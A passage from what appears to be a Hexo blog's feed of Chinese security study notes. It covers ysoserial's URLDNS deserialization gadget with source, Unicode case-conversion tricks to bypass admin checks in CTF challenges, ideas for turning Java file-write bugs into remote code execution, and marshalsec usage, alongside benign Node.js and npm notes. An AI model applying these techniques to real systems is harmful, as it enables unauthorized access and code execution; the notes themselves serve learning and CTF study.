src="images/image-20220918233654716.png" alt="image-20220918233654716"></p><h2 id="ysoserial的实现"><a href="#ysoserial的实现" class="headerlink" title="ysoserial的实现"></a>ysoserial的实现</h2><p><code>ysoserial</code>是<code>java</code>反序列化利用链的集合工具，可以根据我们需要的利用链生成反序列 POC。项目地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>下载源代码后导入 idea，根据<code>pom.xml</code>文件中的引导设置<code>GeneratePayload.java</code>文件为<code>mainClass</code><br><img src="images/image-20220919172929224.png" alt="image-20220919172929224"></p><p>设置<code>URLDNS</code>的运行参数<img src="images/image-20220919173043221.png" alt="image-20220919173043221"></p><p>其中<code>URLDNS</code>利用链部分的实现源码如下（删除部分不重要的内容）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简化后如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure></p><p>可以看到<code>ysoserial</code>直接继承<code>URLStreamHandler</code>类重写了<code>getHostAddress()</code>方法为空，因此避免了在生成<code>payload</code>的时候发起<code>DNS</code>请求。</p><p><strong>那为什么反序列化后还能发送<code>DNS</code>请求？</strong></p><p>可以看到在<code>java.net.URL</code>类中<code>handler</code>参数被<code>transient</code>关键字修饰<br><img src="images/image-20220919182207942.png" alt="image-20220919182207942"></p><blockquote><p>一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问（被忽略）</p></blockquote><p>因此在序列化的过程中会忽略掉<code>handler</code>，在反序列化时能正常执行<code>DNS</code>请求。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/"/>
      <url>/2021/11/10/javabean%E4%B8%8E%E5%86%85%E7%9C%81/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/uu5666/p/8601983.html">https://www.cnblogs.com/uu5666/p/8601983.html</a><br>简单的说安全问题就是可以调用set和get方法<br>参考 CB 链</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java大小写特性</title>
      <link href="/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/"/>
      <url>/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于<code>toUpperCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure><p>对于<code>toLowerCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><h2 id="CTF题实例-Hacktm中的一道Nodejs题"><a href="#CTF题实例-Hacktm中的一道Nodejs题" class="headerlink" title="CTF题实例 - Hacktm中的一道Nodejs题"></a><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></h2><p>题目部分源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isValidUser</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.<span class="property">username</span>.<span class="property">length</span> &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() !== config.<span class="property">adminUsername</span>.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> u.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() == config.<span class="property">adminUsername</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><p>题目完整Writeup:<a href="https://xz.aliyun.com/t/7177">HackTM中一道Node.js题分析(Draw with us)</a></p><h2 id="MMCTF"><a href="#MMCTF" class="headerlink" title="MMCTF"></a>MMCTF</h2><p><code>nodejs</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;what&#x27;s your name?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> name=req.<span class="property">body</span>.<span class="property">name</span>.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">man</span>.<span class="property">attack</span>=<span class="number">300</span>;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you&#x27;ve been stronger&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;you are not admin!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>exp.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">300</span>;i&lt;=<span class="number">305</span>;i++)&#123;<span class="comment">//65535</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+i);</span><br><span class="line">    <span class="keyword">var</span> name=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    name=<span class="string">&#x27;adm&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">    <span class="keyword">if</span>(name.<span class="title function_">toLowerCase</span>()!==<span class="string">&quot;admin&quot;</span>&amp;&amp;name.<span class="title function_">toUpperCase</span>()===<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;success&#x27;</span>+<span class="string">&#x27;:&#x27;</span>+<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i)+<span class="string">&#x27;:&#x27;</span>+i);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/"/>
      <url>/2021/11/10/java%E5%86%99%E6%96%87%E4%BB%B6rce/</url>
      
        <content type="html"><![CDATA[<h2 id="如果Java项目存在写文件操作怎么rce"><a href="#如果Java项目存在写文件操作怎么rce" class="headerlink" title="如果Java项目存在写文件操作怎么rce?"></a>如果Java项目存在写文件操作怎么rce?</h2><h3 id="1-普通的Java-web项目"><a href="#1-普通的Java-web项目" class="headerlink" title="1.普通的Java web项目"></a>1.普通的Java web项目</h3><p>直接写jsp木马 （如果能解析</p><h3 id="2-如果不能解析jsp"><a href="#2-如果不能解析jsp" class="headerlink" title="2.如果不能解析jsp"></a>2.如果不能解析jsp</h3><p>通过写class文件让其触发某一个方法然后重写该方法rce。也就是把恶意类写入classpath( target/classes)，再通过某种方式加载、使用该恶意类，触发该恶意类的static代码块或执行该恶意类的某个方法，来实现通用的RCE利用。重点关注class.formane<br>可以参考2021国赛的ezj4va 就是通过重写readobject方法去触发rce。<br>或者可以参考d3ctf中的no rce题中也是写入target/classes中实现静态方法。然后通过jdbc去初始化恶意类触发。</p><h3 id="3-如果项目是jar打包启动的"><a href="#3-如果项目是jar打包启动的" class="headerlink" title="3.如果项目是jar打包启动的"></a>3.如果项目是jar打包启动的</h3><p>面前自己遇到的是springboot项目 通过覆盖charset.jar去hook实现rce。大概原理就是jvm启动的过程中不会全部加载资源如charset.jar是不会加载的只有通过特点方法才会加载。这样可以减少Java内存的消耗。<br>参考 文章springboot写文件rce</p><h3 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h3><p><a href="https://landgrey.me/blog/22/">https://landgrey.me/blog/22/</a></p><p><a href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/</a></p><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p><a href="https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/">https://threedr3am.github.io/2021/04/13/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84Fastjson%20RCE/</a></p><p>&gt;<br><a href="https://www.cnblogs.com/wh4am1/p/14681335.html">https://www.cnblogs.com/wh4am1/p/14681335.html</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI3MzUwMTQwNg==&amp;mid=2247485312&amp;idx=1&amp;sn=22dddceccf679f34705d987181a328db&amp;token=1393640502&amp;lang=zh_CN&amp;scene=21#wechat_redirect</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/marshalsec/"/>
      <url>/2021/11/10/marshalsec/</url>
      
        <content type="html"><![CDATA[<h1 id="marshalsec使用"><a href="#marshalsec使用" class="headerlink" title="marshalsec使用"></a>marshalsec使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>-a：生成exploit下的所有payload</li><li>-t：对生成的payloads进行解码测试</li><li>-v：verbose mode, 展示生成的payloads</li><li>gadget_type：指定使用的payload</li><li>arguments: payload运行时使用的参数</li><li>marshalsec.<marshaller>：指定exploits，根目录下的java文件名</marshaller></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nodejs的序列化与反序列化</title>
      <link href="/2021/11/10/learn/"/>
      <url>/2021/11/10/learn/</url>
      
        <content type="html"><![CDATA[<h1 id="nodejs-的序列化与反序列化"><a href="#nodejs-的序列化与反序列化" class="headerlink" title="nodejs 的序列化与反序列化"></a>nodejs 的序列化与反序列化</h1><h1 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h1><p><code>stringify</code>函数的作用就是序列化对象，也就是说将对象类型转换成一个字符串类型（默认的分割符（”&amp;”）和分配符（”=”）），先介绍它的基本用法，在下一节里我们将学习如何替换默认分配符，下面我们就通过以下例子来清楚的认识一下吧！</p><p>例1：querystring.stringify(“对象”)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> querystring= <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = querystring.<span class="title function_">stringify</span>(&#123;<span class="attr">foo</span>:<span class="string">&#x27;bar&#x27;</span>,<span class="attr">cool</span>:[<span class="string">&#x27;xux&#x27;</span>, <span class="string">&#x27;yys&#x27;</span>]&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);　　</span><br></pre></td></tr></table></figure><p>运行结果：<br>foo=bar&amp;cool=xux&amp;cool=yys</p><p>对象被序列化为字符串之后默认是通过分割符（”&amp;”）和分配符（”=”）组成的，那可不可以改变呢，这节我们就来了解一下，是否可以自己去定义组合结果，看下面的小例子</p><p>例1：querystring.stringify(“对象”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.stringify(&#123;foo:&#x27;bar&#x27;,cool:[&#x27;xux&#x27;, &#x27;yys&#x27;]&#125;,&#x27;*&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#39;foo$bar*cool$xux*cool$yys&#39;</code></p><h1 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h1><p>接下来就来学习反序列化函数——parse函数，parse函数的作用就是反序列化字符串（默认是由”=”、”&amp;”拼接而成），转换得到一个对象类型。如下示例：</p><p>例1：querystring.parse(“字符串”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo=bar&amp;cool=xux&amp;cool=yys&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><code>&#123; foo: &#39;bar&#39;, cool: [&#39;xux&#39;, &#39;yys&#39;]&#125;</code></p><p>现在我们学习parse函数的扩展用法，和上面stringify函数的多参数用法不同的是，parse函数可以根据用户所自定义的分割符、分配符来反序列化字符串，从而得到相应的对象结果.如下示例：</p><p>例1：querystring.parse(“字符串”，”分隔符”，”分配符”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var querystring = require(&#x27;querystring&#x27;);</span><br><span class="line">var result = querystring.parse(&#x27;foo@bar$cool@xux$cool@yys&#x27;,&#x27;@&#x27;,&#x27;$&#x27;);</span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>运行结果：<br><code>&#123; foo: &#39;&#39;, bar: &#39;cool&#39;, xux: &#39;cool&#39;, yys: &#39;&#39; &#125;</code></p><blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/smiler/p/4741875.html">https://www.cnblogs.com/smiler/p/4741875.html</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/npm%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/11/10/npm%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><p>当我们没有项目的时候需要通过<code>npm -init</code>来部署一个项目</p><p><a href="https://www.cnblogs.com/WD-NewDemo/p/11141384.html">使用“npm init”初始化项目</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package name:                      你的项目名字叫啥</span><br><span class="line">version:                          版本号</span><br><span class="line">description:                       对项目的描述</span><br><span class="line">entry point:                      项目的入口文件（一般你要用那个js文件作为node服务，就填写那个文件）</span><br><span class="line">test command:                     项目启动的时候要用什么命令来执行脚本文件（默认为node app.js）</span><br><span class="line">git repository:                    如果你要将项目上传到git中的话，那么就需要填写git的仓库地址（这里就不写地址了）</span><br><span class="line">keywirds：                       项目关键字（我也不知道有啥用，所以我就不写了）</span><br><span class="line">author:                         作者的名字（也就是你叫啥名字）</span><br><span class="line">license:                        发行项目需要的证书（这里也就自己玩玩，就不写了）</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/controllerha/article/details/84256852">npm安装报错npm ERR! Refusing to install package with name “xxxx” under a packagexxxx</a></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>检查package.json下的name字段是不是项目名字和你安装的那个包名字相同了，如果一样就会报那个错，把项目名字改成和你安装不冲突的名字</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Servlet内存马</title>
      <link href="/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/10/10/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bb0024cd678aaf502a8c94058244411218ea6b08e06ab8c0f7c507db220a8c35"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java内存马 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言能实现agent_!</title>
      <link href="/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/"/>
      <url>/2021/10/10/c%E8%AF%AD%E8%A8%80%E8%83%BD%E5%AE%9E%E7%8E%B0agent_!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6a95cb890ff08166bf6516c96bdb9f7dd7cefa59015a3a2ae697ebdbd75ac4f4"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> c语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化日记</title>
      <link href="/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/"/>
      <url>/2020/10/27/test%E7%BE%8E%E5%8C%96%E6%97%A5%E5%BF%97/</url>
      
